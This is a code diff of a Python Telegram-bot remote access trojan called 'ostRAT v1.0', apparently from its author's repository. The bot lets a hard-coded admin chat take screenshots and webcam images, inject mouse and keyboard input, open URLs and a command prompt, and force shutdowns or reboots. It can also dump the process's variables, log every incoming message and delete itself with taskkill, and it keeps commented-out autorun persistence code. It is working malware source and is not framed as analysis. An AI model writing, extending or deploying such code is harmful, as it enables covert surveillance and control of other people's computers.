@@ -7,7 +7,6 @@ from aiogram.utils.keyboard import ReplyKeyboardBuilder
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.fsm.state import State, StatesGroup
 from PIL import ImageColor, ImageDraw, ImageGrab
-from shutil import move as move_file, copy2
 from aiogram.fsm.context import FSMContext
 from aiogram import Bot, Dispatcher, F
 from cv2 import VideoCapture, imwrite
@@ -16,6 +15,7 @@ from aiogram.filters import Command
 from webbrowser import open_new_tab
 from socket import gethostname
 from pathlib import Path
+# from shutil import copy2
 from time import time
 from sys import exit
 
@@ -46,31 +46,32 @@ class YesState(StatesGroup):
 
 
 def log(e: str) -> None:
-    with open("log.txt", "a") as file:
+    print(e)
+    with open('log.txt', 'a') as file:
         file.write(f"\n{time()+3600} - {e}\n")
 
 
 storage = MemoryStorage()
-TOKEN = "0000000000:aabbccddeeffgghhiiggkkllmmnnooppqqr"
+TOKEN = '0000000000:aabbccddeeffgghhiiggkkllmmnnooppqqr'
 adm = 0000000000
 bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=storage)
 
 menu_raw = ReplyKeyboardBuilder()
 menu_raw.row(*(KeyboardButton(text=i) for i in
-               ("Online 🟢", "Screenshot 📸", "Off 🔴", "Reoff 🔄", "Autorun 🟢", "Delete 🗑")))
+               ('Online 🟢', 'Screenshot 📸', 'Off 🔴', 'Reoff 🔄', 'Autorun 🟢', 'Delete 🗑')))
 menu_raw.row(*(KeyboardButton(text=i) for i in
-               ("Сmd 💻", "Url 🔗", "Cam 🎥", "Keyboard Menu ⭕️⌨️", "Mouse Menu ⭕️🖱")))
+               ('Сmd 💻', 'Url 🔗', 'Cam 🎥', 'Keyboard Menu ⭕️⌨️', 'Mouse Menu ⭕️🖱')))
 menu = ReplyKeyboardMarkup(keyboard=menu_raw.export(), resize_keyboard=True)
 
 menukeyboard_raw = ReplyKeyboardBuilder().add(*(
     KeyboardButton(text=i) for i in
-    ("Write ✍️", "Hotkeys 🔥", "Back ↩")))
+    ('Write ✍️', 'Hotkeys 🔥', 'Back ↩')))
 menukeyboard = ReplyKeyboardMarkup(keyboard=menukeyboard_raw.export(), resize_keyboard=True)
 
 menumouse_raw = ReplyKeyboardBuilder().add(*(
     KeyboardButton(text=i) for i in
-    ("Move 🔀", "Pos 📍", "Left Button Click 🖱️◀️", "Right Button Click 🖱️▶️", "Back ↩")))
+    ('Move 🔀', 'Pos 📍', 'Left Button Click 🖱️◀️', 'Right Button Click 🖱️▶️', 'Back ↩')))
 menumouse = ReplyKeyboardMarkup(keyboard=menumouse_raw.export(), resize_keyboard=True)
 
 
@@ -80,15 +81,20 @@ async def start(message: Message):
         username = message.chat.username
         await message.bot.send_message(adm, f"Hi, {username}. ostRAT v1.0 for you", reply_markup=menu)
     else:
-        await message.reply("Hello, you don't have access.")
+        await message.reply('Hello, you haven\'t access.')
 
 
 @dp.message(Command('locals'))
 async def get_locals(message: Message):
     if message.chat.id == adm:
-        await message.bot.send_message(adm, f"Hi, {message.chat.username}. ostRAT v1.0 for you", reply_markup=menu)
+        long = f"locals:\n{'\n'.join((str(i) for i in locals().items()))}\n\nglobals:\n{'\n'.join((str(i) for i in globals().items()))}"
+        # print(long)
+        await message.bot.send_message(adm, long[:int(len(long)*0.25)], reply_markup=menu)
+        await message.bot.send_message(adm, long[int(len(long)*0.25):int(len(long)*0.5)], reply_markup=menu)
+        await message.bot.send_message(adm, long[int(len(long)*0.5):int(len(long)*0.75)], reply_markup=menu)
+        await message.bot.send_message(adm, long[int(len(long)*0.75):], reply_markup=menu)
     else:
-        await message.reply("Hello, you don't have access.")
+        await message.reply('Hello, you haven\'t access.')
 
 
 @dp.message(F.text == 'Online 🟢')
@@ -99,41 +105,41 @@ async def online(message: Message):
 @dp.message(F.text == 'Autorun 🟢')
 async def autorun(message: Message):
     try:
-        await message.bot.send_message(adm, 'No autostart', parse_mode="Markdown")
+        await message.bot.send_message(adm, 'No autostart', parse_mode='Markdown')
         # copy2(__file__, {y})
-        # await message.bot.send_message(adm, f'{Path(__file__).name} in StartUp! ✔️', parse_mode="Markdown")
+        # await message.bot.send_message(adm, f"{Path(__file__).name} in StartUp! ✔️", parse_mode='Markdown')
         # startfile({x})
-        # await message.bot.send_message(adm, f'{Path(__file__).name} runned from StartUp! ✔️', parse_mode="Markdown")
+        # await message.bot.send_message(adm, f"{Path(__file__).name} runned from StartUp! ✔️", parse_mode='Markdown')
     except Exception as e:
-        await message.bot.send_message(adm, f'Error ❌:\n{e}', reply_markup=menu, parse_mode="Markdown")
+        await message.bot.send_message(adm, f"Error ❌:\n{e}", reply_markup=menu, parse_mode='Markdown')
 
 
 @dp.message(F.text == 'Off 🔴')
 async def off(message: Message):
-    await message.bot.send_message(adm, "Turn off! ✔️", reply_markup=menu)
+    await message.bot.send_message(adm, 'Turn off! ✔️', reply_markup=menu)
     shell('shutdown -s /t 0 /f')
 
 
 @dp.message(F.text == 'Reoff 🔄')
 async def restart(message: Message):
-    await message.bot.send_message(adm, "Reboot! ✔️", reply_markup=menu)
+    await message.bot.send_message(adm, 'Reboot! ✔️', reply_markup=menu)
     shell('shutdown -r /t 0 /f')
 
 
 @dp.message(F.text == 'Back ↩')
 async def back(message: Message, state: FSMContext):
-    await message.bot.send_message(adm, "Standart menu is open! ✔️", reply_markup=menu)
+    await message.bot.send_message(adm, 'Standart menu is open! ✔️', reply_markup=menu)
     state.clear()
 
 
 @dp.message(F.text == 'Mouse Menu ⭕️🖱')
 async def mouse_menu(message: Message):
-    await message.bot.send_message(adm, "Mouse menu is open! ✔️", reply_markup=menumouse)
+    await message.bot.send_message(adm, 'Mouse menu is open! ✔️', reply_markup=menumouse)
 
 
 @dp.message(F.text == 'Move 🔀')
 async def move_to(message: Message, state: FSMContext):
-    await message.bot.send_message(adm, "Enter position: ")
+    await message.bot.send_message(adm, 'Enter position: ')
     await state.set_state(MoveState.MovetoOne)
 
 
@@ -142,7 +148,7 @@ async def move_to_in(message: Message, state: FSMContext):
     x, y = message.text.strip().split(',')
     move_mouse(int(x), int(y), absolute=True, duration=0.1)
 
-    await message.bot.send_message(adm, "Send! ✔️")
+    await message.bot.send_message(adm, 'Send! ✔️')
     await state.clear()
 
 
@@ -154,23 +160,23 @@ async def get_pos(message: Message):
 @dp.message(F.text == 'Left Button Click 🖱️◀️')
 async def left_button_click(message: Message):
     click()
-    await message.bot.send_message(adm, "Left mouse button is click! ✔️")
+    await message.bot.send_message(adm, 'Left mouse button is click! ✔️')
 
 
 @dp.message(F.text == 'Right Button Click 🖱️▶️')
 async def right_button_click(message: Message):
     right_click()
-    await message.bot.send_message(adm, "Right mouse button is click! ✔️")
+    await message.bot.send_message(adm, 'Right mouse button is click! ✔️')
 
 
 @dp.message(F.text == 'Keyboard Menu ⭕️⌨️')
 async def keyboard_menu(message: Message):
-    await message.bot.send_message(adm, "Keyboard menu is open! ✔️", reply_markup=menukeyboard)
+    await message.bot.send_message(adm, 'Keyboard menu is open! ✔️', reply_markup=menukeyboard)
 
 
 @dp.message(F.text == 'Write ✍️')
 async def write(message: Message, state: FSMContext):
-    await message.bot.send_message(adm, "Enter text: ")
+    await message.bot.send_message(adm, 'Enter text: ')
     await state.set_state(WriteState.textcommand)
 
 
@@ -178,13 +184,13 @@ async def write(message: Message, state: FSMContext):
 async def write_in(message: Message, state: FSMContext):
     # await state.update_data(textm=message.text)
     k_write(message.text)
-    await message.bot.send_message(adm, "Send! ✔️")
+    await message.bot.send_message(adm, 'Send! ✔️')
     await state.clear()
 
 
 @dp.message(F.text == 'Hotkeys 🔥')
 async def hotkey(message: Message, state: FSMContext):
-    await message.bot.send_message(adm, "Enter hotkey(button1+button2): ")
+    await message.bot.send_message(adm, 'Enter hotkey(button1+button2): ')
     await state.set_state(BindState.bind)
 
 
@@ -194,7 +200,7 @@ async def hotkey_in(message: Message, state: FSMContext):
     # bindm = message.text
     k_press(message.text)
     k_release(message.text)
-    await message.bot.send_message(adm, "Send! ✔️")
+    await message.bot.send_message(adm, 'Send! ✔️')
     await state.clear()
 
 
@@ -204,13 +210,13 @@ async def get_screenshot(message: Message):
         position = get_mouse_pos()
         new_image = ImageGrab.grab()
         draw = ImageDraw.Draw(new_image)
-        draw.rectangle((*position, position[0]+2, position[1]+2), fill=ImageColor.getrgb("red"))
+        draw.rectangle((*position, position[0]+2, position[1]+2), fill=ImageColor.getrgb('red'))
         new_image.save()
         if message.chat.id == adm:
             await message.reply_photo(FSInputFile('temp.jpg'))
         remove('temp.jpg')
     except Exception as e:
-        print(f'Error > Screenshot:\n{e}')
+        print(f"Error > Screenshot:\n{e}")
 
 
 @dp.message(F.text == 'Cam 🎥')
@@ -234,46 +240,48 @@ async def open_cmd(message: Message):
         startfile('cmd.exe')
         await message.bot.send_message(adm, 'Cmd is open! ✔️')
     except Exception as e:
-        await message.bot.send_message(adm, f'Error > RunCMD:\n{e}')
+        await message.bot.send_message(adm, f"Error > RunCMD:\n{e}")
 
 
 @dp.message(F.text == 'Url 🔗')
 async def open_url(message: Message, state: FSMContext):
-    await message.bot.send_message(adm, "Enter link: ")
+    await message.bot.send_message(adm, 'Enter link: ')
     await state.set_state(UrlState.url)
 
 
 @dp.message(UrlState.url)
 async def open_url_in(message: Message, state: FSMContext):
-    # await state.update_data()
-    # data = await state.get_data()
-    url = message.text
-    open_new_tab(url)
-    await message.bot.send_message(adm, "Link is open! ✔️")
+    open_new_tab(message.text)
+    await message.bot.send_message(adm, 'Link is open! ✔️')
     await state.clear()
 
 
 @dp.message(F.text == 'Delete 🗑')
 async def delete(message: Message, state: FSMContext):
-    await message.bot.send_message(adm, "Confirm delete(y/n): ")
+    await message.bot.send_message(adm, 'Confirm delete(y/n): ')
     await state.set_state(YesState.accept)
 
 
 @dp.message(YesState.accept)
 async def delete_accept(message: Message, state: FSMContext):
-    # await state.update_data(accept=message.text)
-    # data = await state.get_data()
     accept: str = message.text[0]  # 'no'[0] == 'n'
-    if accept.lower() == "y":
-        move_file(__file__, Path('C:/ProgramData'))
-        shell(f'taskkill /im {Path(__file__).name} /f')
-        await message.bot.send_message(adm, "ostRAT deleted! ✔️")
-    elif accept.lower() == "n":
-        await message.bot.send_message(adm, 'Delete canceled! ❌', parse_mode="Markdown")
+    if accept.lower() == 'y':
+        remove(__file__)  # ?
+        shell(f"taskkill /im {Path(__file__).name} /f")
+        await message.bot.send_message(adm, 'ostRAT deleted! ✔️')
+    elif accept.lower() == 'n':
+        await message.bot.send_message(adm, 'Delete canceled! ❌', parse_mode='Markdown')
     await state.clear()
 
 
+@dp.message()
+async def loggin(message: Message, state: FSMContext):
+    if logging:
+        log(message.__dict__)
+
+
 try:
+    logging: bool = True
     async_run(dp.start_polling(bot))
 except Exception as e:
     raise e
